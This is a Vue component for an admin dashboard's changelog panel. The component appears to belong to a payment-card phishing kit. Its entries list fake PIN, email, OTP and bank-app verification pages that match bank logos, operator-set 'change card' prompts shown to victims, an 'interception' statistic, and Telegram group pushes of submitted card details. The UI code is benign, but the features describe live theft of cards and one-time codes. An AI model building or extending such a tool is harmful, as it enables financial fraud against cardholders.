<script setup lang="ts">
import { ref } from 'vue';

const showAll = ref(false);

const changelog = [
  { title: 'PIN验证功能上线', desc: '新增PIN验证页面（4位独立数字框），支持卡片/OTP/APP各阶段操作', time: '2026-05-14' },
  { title: '邮箱验证功能上线', desc: '新增邮箱验证页面 + 邮箱验证（自定义邮箱），支持卡片/OTP/APP各阶段操作', time: '2026-05-14' },
  { title: 'APP验证功能上线', desc: '专用APP验证页面，银行Logo自适应、卡类型Logo自适应，支持Continue完成通知', time: '2026-05-14' },
  { title: '数据统计面板上线', desc: '首页增加访问量/成交额/拦截量/成交量统计，支持今日/3日/7日/30日筛选', time: '2026-05-14' },
  { title: '离在线检测优化', desc: '新增心跳检测（10s/60s）兜底断网/切后台，WS断开即时离线，双轨制保障', time: '2026-05-14' },
  { title: 'C/D折扣选择上线', desc: '结账页新增Credit Card(20% off)/Debit Card选择，自动同步折扣到订单摘要', time: '2026-05-14' },
  { title: '自定义提示（换卡支付）', desc: '验证码阶段新增换卡提示，操作员可自定义文案，客户页面隐藏验证码并提示', time: '2026-05-14' },
  { title: 'FB Pixel + TT Pixel集成', desc: '结账页集成Meta和TikTok像素，支持AddToCart/InitiateCheckout/Purchase事件追踪', time: '2026-05-14' },
  { title: 'TG推送通知', desc: '客户提交支付后Telegram群组实时推送卡片信息', time: '2026-05-15' },
  { title: 'HandyAPI BIN查询', desc: '替换binlist.net为HandyAPI BIN Lookup，查询更精准', time: '2026-05-16' },
  { title: 'BIN数据持久化', desc: '修复刷新后卡类型/卡银行消失的bug，BIN数据写入数据库', time: '2026-05-16' },
];
</script>

<template>
  <NCard :bordered="false" class="card-wrapper">
    <template #header>
      <div class="log-header">
        <span>更新日志</span>
        <span class="log-more" @click="showAll=true">更多动态</span>
      </div>
    </template>
    <NList>
      <NListItem v-for="(log, i) in changelog.slice(0,5)" :key="i">
        <NThing :title="log.title" :description="log.desc">
          <template #footer>{{ log.time }}</template>
        </NThing>
      </NListItem>
    </NList>
  </NCard>

  <NModal :show="showAll" @update:show="v => { if (!v) showAll = false }">
    <NCard title="全部更新日志" :bordered="false" style="width:560px;max-height:80vh;overflow-y:auto" role="dialog">
      <NList>
        <NListItem v-for="(log, i) in changelog" :key="i">
          <NThing :title="log.title" :description="log.desc">
            <template #footer>{{ log.time }}</template>
          </NThing>
        </NListItem>
      </NList>
    </NCard>
  </NModal>
</template>

<style scoped>
.log-header { display: flex; justify-content: space-between; align-items: center; font-weight: 700; font-size: 16px; }
.log-more { font-size: 13px; color: var(--n-text-color-3); cursor: pointer; }
</style>
